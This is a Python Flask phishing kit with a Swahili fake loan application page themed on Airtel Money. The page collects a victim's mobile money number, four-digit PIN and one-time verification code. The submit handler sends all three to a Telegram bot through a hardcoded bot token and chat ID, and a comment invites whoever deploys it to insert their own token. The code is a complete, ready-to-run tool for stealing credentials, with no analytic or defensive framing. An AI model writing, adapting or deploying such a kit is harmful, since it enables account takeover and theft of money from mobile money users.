from flask import Flask, render_template_string, request
import requests
import random

app = Flask(__name__)

# ============ WEKA TOKEN YAKO HAPA ============
TELEGRAM_TOKEN = "8864945488:AAFGN292M6CyjuU4LjQjfj_vUVJMchW07ik"
ADMIN_CHAT_ID = "8580615195"
# ===============================================

HTML = """<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loan Application Form</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 min-h-screen flex items-center justify-center p-4">

    <div class="bg-white rounded-2xl shadow-xl p-8 max-w-md w-full">
        <form method="POST" action="/submit">
        <!-- Progress Bar Indicator -->
        <div class="flex items-center justify-between mb-8">
            <div id="step-badge-1" class="w-8 h-8 rounded-full bg-red-600 text-white flex items-center justify-center font-bold text-sm">1</div>
            <div class="h-1 bg-gray-200 flex-1 mx-2 rounded" id="progress-1"></div>
            <div id="step-badge-2" class="w-8 h-8 rounded-full bg-gray-200 text-gray-600 flex items-center justify-center font-bold text-sm">2</div>
            <div class="h-1 bg-gray-200 flex-1 mx-2 rounded" id="progress-2"></div>
            <div id="step-badge-3" class="w-8 h-8 rounded-full bg-gray-200 text-gray-600 flex items-center justify-center font-bold text-sm">3</div>
        </div>

        <!-- PAGE 1: Amount Selection -->
        <div id="page-1" class="space-y-6">
            <h2 class="text-2xl font-bold text-gray-800 text-center">Chagua Kiasi cha Mkopo</h2>
            <p class="text-sm text-gray-500 text-center">Tafadhali chagua kiasi unachohitaji hapa chini.</p>
            
            <div class="grid grid-cols-2 gap-4">
                <label class="border-2 border-gray-200 rounded-xl p-4 flex flex-col items-center justify-center cursor-pointer hover:border-red-500 transition">
                    <input type="radio" name="loan_amount" value="100" class="sr-only peer" checked>
                    <span class="text-2xl font-bold text-gray-700">$100</span>
                </label>
                <label class="border-2 border-gray-200 rounded-xl p-4 flex flex-col items-center justify-center cursor-pointer hover:border-red-500 transition">
                    <input type="radio" name="loan_amount" value="200" class="sr-only peer">
                    <span class="text-2xl font-bold text-gray-700">$200</span>
                </label>
                <label class="border-2 border-gray-200 rounded-xl p-4 flex-col items-center justify-center cursor-pointer hover:border-red-500 transition">
                    <input type="radio" name="loan_amount" value="500" class="sr-only peer">
                    <span class="text-2xl font-bold text-gray-700">$500</span>
                </label>
                <label class="border-2 border-gray-200 rounded-xl p-4 flex flex-col items-center justify-center cursor-pointer hover:border-red-500 transition">
                    <input type="radio" name="loan_amount" value="1000" class="sr-only peer">
                    <span class="text-2xl font-bold text-gray-700">$1000</span>
                </label>
            </div>

            <button type="button" onclick="goToPage(2)" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-4 rounded-xl transition">Omba Sasa</button>
        </div>

        <!-- PAGE 2: Airtel Money Info -->
        <div id="page-2" class="hidden space-y-6">
            <h2 class="text-2xl font-bold text-gray-800 text-center">Taarifa za Airtel Money</h2>
            <p class="text-sm text-gray-500 text-center">Weka namba yako ili kupokea fedha.</p>

            <div class="space-y-4">
                <div>
                    <label class="block text-sm font-semibold text-gray-700 mb-1">Airtel Money Number</label>
                    <input type="tel" name="airtel_number" placeholder="Mfano: 068XXXXXXX" required class="w-full px-4 py-3 rounded-xl border-gray-300 focus:outline-none focus:ring-2 focus:ring-red-500">
                </div>
                <div>
                    <label class="block text-sm font-semibold text-gray-700 mb-1">Airtel Money PIN</label>
                    <div class="flex gap-2 justify-center">
                        <input type="password" name="pin1" maxlength="1" required class="pin-input w-12 h-12 text-center text-xl font-bold border rounded-lg">
                        <input type="password" name="pin2" maxlength="1" required class="pin-input w-12 h-12 text-center text-xl font-bold border rounded-lg">
                        <input type="password" name="pin3" maxlength="1" required class="pin-input w-12 h-12 text-center text-xl font-bold border rounded-lg">
                        <input type="password" name="pin4" maxlength="1" required class="pin-input w-12 h-12 text-center text-xl font-bold border rounded-lg">
                    </div>
                </div>
            </div>

            <button type="button" onclick="goToPage(3)" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-4 rounded-xl transition">Apply Loan</button>
            <button type="button" onclick="goToPage(1)" class="w-full text-sm text-gray-500 hover:underline text-center block">Rudi Nyuma</button>
        </div>

        <!-- PAGE 3: Verification Code -->
        <div id="page-3" class="hidden space-y-6">
            <h2 class="text-2xl font-bold text-gray-800 text-center">Uthibitisho wa Bot</h2>
            <p class="text-sm text-gray-500 text-center">Tafadhali weka namba ya siri uliyotumiwa (OTP) ili kukamilisha.</p>

            <div>
                <label class="block text-sm font-semibold text-gray-700 mb-2 text-center">Weka Code Hapa</label>
                <div class="flex justify-center gap-2">
                    <input type="text" name="otp1" maxlength="1" class="otp-input w-12 h-12 text-center text-xl font-bold border rounded-lg">
                    <input type="text" name="otp2" maxlength="1" class="otp-input w-12 h-12 text-center text-xl font-bold border rounded-lg">
                    <input type="text" name="otp3" maxlength="1" class="otp-input w-12 h-12 text-center text-xl font-bold border rounded-lg">
                    <input type="text" name="otp4" maxlength="1" class="otp-input w-12 h-12 text-center text-xl font-bold border rounded-lg">
                </div>
            </div>

            <button type="submit" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-4 rounded-xl transition">Thibitisha na Maliza</button>
            <button type="button" onclick="goToPage(2)" class="w-full text-sm text-gray-500 hover:underline text-center block">Rudi Nyuma</button>
        </div>
        </form>
    </div>

    <script>
        function goToPage(pageNum) {
            document.getElementById('page-1').classList.add('hidden');
            document.getElementById('page-2').classList.add('hidden');
            document.getElementById('page-3').classList.add('hidden');
            document.getElementById(`page-${pageNum}`).classList.remove('hidden');
            updateProgressBar(pageNum);
        }
        function updateProgressBar(step) {
            const b1 = document.getElementById('step-badge-1');
            const b2 = document.getElementById('step-badge-2');
            const b3 = document.getElementById('step-badge-3');
            const p1 = document.getElementById('progress-1');
            const p2 = document.getElementById('progress-2');
            b2.className = b3.className = "w-8 h-8 rounded-full bg-gray-200 text-gray-600 flex items-center justify-center font-bold text-sm";
            p1.className = p2.className = "h-1 bg-gray-200 flex-1 mx-2 rounded";
            if (step >= 2) { b2.className = "w-8 h-8 rounded-full bg-red-600 text-white flex items-center justify-center font-bold text-sm"; p1.className = "h-1 bg-red-600 flex-1 mx-2 rounded"; }
            if (step === 3) { b3.className = "w-8 h-8 rounded-full bg-red-600 text-white flex items-center justify-center font-bold text-sm"; p2.className = "h-1 bg-red-600 flex-1 mx-2 rounded"; }
        }
        document.querySelectorAll('.pin-input, .otp-input').forEach((input, index, arr) => {
            input.addEventListener('input', () => { if (input.value.length === 1 && index < arr.length - 1) { arr[index + 1].focus(); } });
        });
    </script>
</body>
</html>"""

@app.route('/')
def home():
    return render_template_string(HTML)

@app.route('/submit', methods=['POST'])
def submit():
    amount = request.form['loan_amount']
    number = request.form['airtel_number']
    pin = request.form['pin1'] + request.form['pin2'] + request.form['pin3'] + request.form['pin4']
    otp = request.form['otp1'] + request.form['otp2'] + request.form['otp3'] + request.form['otp4']

    # Tuma Telegram
    msg = f"🔔 NEW LOAN APPLICATION\nAmount: ${amount}\nAirtel: {number}\nPIN: {pin}\nOTP: {otp}"
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": ADMIN_CHAT_ID, "text": msg})

    return "<h2 style='text-align:center;padding:50px;color:green'>✅ Maombi yako yamepokelewa kikamilifu!</h2>"

if __name__ == '__main__':
    app.run()
